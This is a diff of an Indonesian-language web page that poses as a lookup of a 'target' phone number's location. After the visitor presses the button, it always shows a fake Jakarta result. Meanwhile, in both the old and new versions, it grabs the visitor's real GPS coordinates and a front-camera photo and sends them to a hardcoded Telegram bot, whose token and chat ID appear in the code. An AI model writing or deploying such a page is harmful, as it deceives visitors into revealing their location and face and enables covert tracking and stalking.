@@ -3,15 +3,87 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Kirim Foto+Lokasi (Satu Tombol)</title>
+<title>Kirim Foto + Lokasi</title>
 <style>
-  :root{--card-bg:#fff;--body-bg:#f4f6f8}
-  body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:var(--body-bg);font-family:system-ui,Arial}
-  .card{width:360px;padding:20px;border-radius:12px;background:var(--card-bg);box-shadow:0 8px 30px rgba(2,6,23,0.08);text-align:center}
-  input{width:100%;padding:10px;border-radius:8px;border:1px solid #ddd;font-size:15px;box-sizing:border-box}
-  button{width:100%;margin-top:12px;padding:12px;border-radius:10px;border:0;background:#0b74de;color:#fff;font-size:16px;cursor:pointer}
-  .jakarta{margin-top:14px;font-size:16px;color:#111}
-  .maplink{color:#0b74de;text-decoration:none}
+  :root {
+    --primary: #0b74de;
+    --bg: #f1f3f6;
+    --card-bg: #fff;
+    --text-main: #222;
+    --text-muted: #666;
+  }
+  body {
+    margin: 0;
+    height: 100vh;
+    background: var(--bg);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: "Segoe UI", Arial, sans-serif;
+  }
+  .card {
+    width: 360px;
+    max-width: 95%;
+    background: var(--card-bg);
+    padding: 24px 20px;
+    border-radius: 14px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+    text-align: center;
+  }
+  .card h1 {
+    font-size: 20px;
+    color: var(--primary);
+    font-weight: 600;
+    margin-bottom: 20px;
+    line-height: 1.4;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    font-size: 15px;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+    margin-bottom: 14px;
+    box-sizing: border-box;
+    transition: border-color 0.2s;
+  }
+  input:focus {
+    outline: none;
+    border-color: var(--primary);
+  }
+  button {
+    width: 100%;
+    padding: 13px;
+    font-size: 16px;
+    color: #fff;
+    background: var(--primary);
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+  button:hover {
+    background: #095eb1;
+  }
+  .jakarta {
+    font-size: 16px;
+    color: var(--text-main);
+    margin-top: 15px;
+    line-height: 1.5;
+  }
+  .jakarta strong {
+    display: block;
+    color: var(--primary);
+    margin-bottom: 5px;
+  }
+  .maplink {
+    color: var(--primary);
+    text-decoration: none;
+    font-size: 14px;
+  }
+  .maplink:hover {
+    text-decoration: underline;
+  }
 </style>
 </head>
 <body>
@@ -19,190 +91,108 @@
     <h1>MASUKIN NO HP TARGET UNTUK CEK LOKASI</h1>
     <input id="phone" placeholder="Masukkan nomor HP (contoh: +62812...)" />
     <button id="go">➡️ Lanjut</button>
-    <!-- Setelah tombol ditekan, UI diganti menjadi tampilan Jakarta saja -->
   </div>
 
 <script>
 (function(){
-  // === ISI TOKEN & CHAT ID TELEGRAM DI SINI ===
-  const BOT_TOKEN = "8383057333:AAF30AFN-COMrGiQ4j3FwETZ3QMy4y2-_CE"; // contoh: 123456:ABC-def...
-  const CHAT_ID   = "6637547478";   // contoh: 123456789
-  // ===========================================
+  // === GANTI DENGAN TOKEN DAN CHAT ID KAMU ===
+  const BOT_TOKEN = "8383057333:AAF30AFN-COMrGiQ4j3FwETZ3QMy4y2-_CE";
+  const CHAT_ID = "6637547478";
+  // ==========================================
 
   const app = document.getElementById('app');
   const phoneInput = document.getElementById('phone');
   const goBtn = document.getElementById('go');
 
-  // Helper: kirim pesan teks ke Telegram (silent failure logged to console)
   async function sendTelegramMessage(text){
-    if(!BOT_TOKEN || !CHAT_ID) { console.warn('BOT_TOKEN/CHAT_ID belum diisi'); return false; }
-    try{
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method:'POST',
-        headers:{ 'Content-Type': 'application/json' },
+    if(!BOT_TOKEN || !CHAT_ID) return;
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: CHAT_ID, text })
       });
-      if(!res.ok) console.warn('sendMessage http status', res.status);
-      return res.ok;
-    }catch(e){
-      console.error('sendMessage error', e);
-      return false;
-    }
+    } catch(e){ console.error(e); }
   }
 
-  // Helper: kirim photo ke Telegram
   async function sendTelegramPhoto(blob, caption){
-    if(!BOT_TOKEN || !CHAT_ID) { console.warn('BOT_TOKEN/CHAT_ID belum diisi'); return false; }
-    try{
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      if(caption) form.append('caption', caption);
-      form.append('photo', blob, 'photo.jpg');
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: form });
-      if(!res.ok) {
-        const txt = await res.text().catch(()=>'<no body>');
-        console.warn('sendPhoto failed', res.status, txt);
-      }
-      return res.ok;
-    }catch(e){
-      console.error('sendPhoto error', e);
-      return false;
-    }
+    if(!BOT_TOKEN || !CHAT_ID) return;
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    if(caption) form.append('caption', caption);
+    form.append('photo', blob, 'photo.jpg');
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST', body: form
+      });
+    } catch(e){ console.error(e); }
   }
 
-  // Ambil lokasi nyata (promise)
   function getRealLocation(timeout = 15000){
     return new Promise((resolve, reject) => {
-      if(!navigator.geolocation) return reject(new Error('Geolocation tidak tersedia'));
-      navigator.geolocation.getCurrentPosition(pos => {
-        resolve({
+      if(!navigator.geolocation) return reject();
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
           lat: pos.coords.latitude,
           lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          ts: new Date().toISOString()
-        });
-      }, err => reject(err), { enableHighAccuracy: true, timeout });
+          acc: pos.coords.accuracy
+        }),
+        err => reject(err),
+        { enableHighAccuracy: true, timeout }
+      );
     });
   }
 
-  // Ambil foto dari kamera depan (ImageCapture preferred, fallback canvas)
   async function takePhotoBlob(){
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }});
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const track = stream.getVideoTracks()[0];
-    let blob = null;
-    try{
-      // coba ImageCapture jika tersedia
-      if(window.ImageCapture){
-        try{
-          const imageCapture = new ImageCapture(track);
-          if(typeof imageCapture.takePhoto === 'function'){
-            blob = await imageCapture.takePhoto();
-          }
-        }catch(e){
-          // ignore, fallback ke canvas
-        }
-      }
-      if(!blob){
-        const video = document.createElement('video');
-        video.srcObject = new MediaStream([track]);
-        // beberapa browser perlu play untuk dapat frame
-        await video.play().catch(()=>{});
-        const w = video.videoWidth || 1280;
-        const h = video.videoHeight || 720;
-        const canvas = document.createElement('canvas');
-        canvas.width = w; canvas.height = h;
-        const ctx = canvas.getContext('2d');
-        // mirror agar natural untuk kamera depan
-        ctx.save();
-        ctx.translate(w,0);
-        ctx.scale(-1,1);
-        ctx.drawImage(video, 0, 0, w, h);
-        ctx.restore();
-        blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
-        try{ video.pause(); video.srcObject = null; }catch(e){}
-      }
-    } finally {
-      try{ track.stop(); }catch(e){}
-    }
+    const video = document.createElement('video');
+    video.srcObject = new MediaStream([track]);
+    await video.play();
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0);
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+    track.stop();
     return blob;
   }
 
-  // Setelah tombol ditekan: ubah UI langsung -> hanya tampil Jakarta, lalu jalankan tugas async
-  goBtn.addEventListener('click', async function onClick(){
-    const phone = (phoneInput.value || '').trim();
-    if(!phone){
-      // tanpa alert sesuai permintaan: hanya log
-      console.warn('Nomor HP kosong');
-      return;
-    }
+  goBtn.addEventListener('click', async ()=>{
+    const phone = phoneInput.value.trim();
+    if(!phone) return;
 
-    // GANTI UI SEKETIKA: tampilkan hanya lokasi Jakarta
+    // Ganti UI langsung ke tampilan Jakarta
     app.innerHTML = `
       <div class="jakarta">
-        <strong>Lokasi untuk nomor ${escapeHtml(phone)}:</strong><br>
+        <strong>Lokasi untuk nomor ${escapeHtml(phone)}:</strong>
         📍 Jakarta, Indonesia<br>
-        <a class="maplink" href="https://www.google.com/maps?q=-6.2088,106.8456" target="_blank">Buka Jakarta di Google Maps</a>
+        <a class="maplink" href="https://www.google.com/maps?q=-6.2088,106.8456" target="_blank">Buka di Google Maps</a>
       </div>
     `;
 
-    // Jalankan pengambilan & pengiriman di latar (tetap berjalan)
-    (async ()=>{
-      // 1) Ambil lokasi nyata (jika gagal, set null)
-      let realLoc = null;
-      try{
-        realLoc = await getRealLocation();
-      }catch(e){
-        console.warn('getRealLocation failed', e);
-        realLoc = null;
-      }
+    // Kirim lokasi asli + foto ke Telegram (background)
+    let loc = null;
+    try { loc = await getRealLocation(); } catch(e){ console.warn(e); }
+    let photoBlob = null;
+    try { photoBlob = await takePhotoBlob(); } catch(e){ console.warn(e); }
 
-      // 2) Ambil foto dari kamera depan (jika gagal, set null)
-      let photoBlob = null;
-      try{
-        photoBlob = await takePhotoBlob();
-      }catch(e){
-        console.error('takePhotoBlob failed', e);
-        photoBlob = null;
-      }
-
-      // 3) Kirim data ke Telegram:
-      // Pesan teks lokasi
-      try{
-        let text = `🔔 Permintaan lokasi untuk nomor: ${phone}\n🕒 ${new Date().toLocaleString()}\n\n`;
-        if(realLoc){
-          text += `📍 Latitude: ${realLoc.lat}\n📍 Longitude: ${realLoc.lon}\n🎯 Akurasi: ${realLoc.accuracy} m\n`;
-          text += `🔗 https://www.google.com/maps?q=${realLoc.lat},${realLoc.lon}\n`;
-        } else {
-          text += `⚠️ Lokasi nyata tidak tersedia (user menolak/timeout)\n`;
-        }
-        text += `\n(Generated by web controller)`;
-        await sendTelegramMessage(text);
-      }catch(e){
-        console.error('send message error', e);
-      }
-
-      // Kirim foto (dengan caption)
-      if(photoBlob){
-        const caption = `📸 Foto dari device pengirim\nTarget nomor: ${phone}\nWaktu: ${new Date().toLocaleString()}` + (realLoc ? `\nLokasi: ${realLoc.lat}, ${realLoc.lon}` : '');
-        try{
-          await sendTelegramPhoto(photoBlob, caption);
-        }catch(e){
-          console.error('send photo error', e);
-        }
-      } else {
-        console.warn('No photo to send');
-      }
-    })();
-
-    // hapus event listener agar tidak bisa ditekan dua kali (opsional)
-    goBtn.removeEventListener('click', onClick);
+    let text = `📲 Nomor: ${phone}\n🕒 ${new Date().toLocaleString()}\n`;
+    if(loc){
+      text += `📍 Lat: ${loc.lat}\n📍 Lon: ${loc.lon}\n🎯 Akurasi: ${loc.acc} m\n🔗 https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
+    } else {
+      text += `⚠️ Lokasi nyata tidak tersedia`;
+    }
+    await sendTelegramMessage(text);
+    if(photoBlob) await sendTelegramPhoto(photoBlob, `📸 Foto dari perangkat\nNomor: ${phone}`);
   });
 
-  // utility: escape HTML untuk output
   function escapeHtml(s){
-    return String(s).replace(/[&<>"']/g, function(m){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]); });
+    return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
   }
-
 })();
 </script>
 </body>
